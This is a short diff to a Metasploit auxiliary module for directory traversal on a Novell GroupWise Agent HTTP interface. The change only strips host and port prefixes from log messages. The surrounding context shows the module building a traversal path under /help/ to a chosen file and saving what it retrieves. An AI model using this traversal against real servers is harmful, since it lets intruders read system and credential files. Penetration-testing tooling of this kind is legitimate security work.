@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     if not is_groupwise?
-      vprint_error("#{rhost}:#{rport} - This isn't a GroupWise Agent HTTP Interface")
+      vprint_error("This isn't a GroupWise Agent HTTP Interface")
       return
     end
 
@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
 
     travs = normalize_uri("/help/", travs, datastore['FILEPATH'])
 
-    vprint_status("#{rhost}:#{rport} - Sending request...")
+    vprint_status("Sending request...")
     res = send_request_cgi({
       'uri' => travs,
       'method' => 'GET',
@@ -83,9 +83,9 @@ class MetasploitModule < Msf::Auxiliary
         contents,
         fname
       )
-      print_good("#{rhost}:#{rport} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      vprint_error("#{rhost}:#{rport} - Failed to retrieve file")
+      vprint_error("Failed to retrieve file")
       return
     end
   end
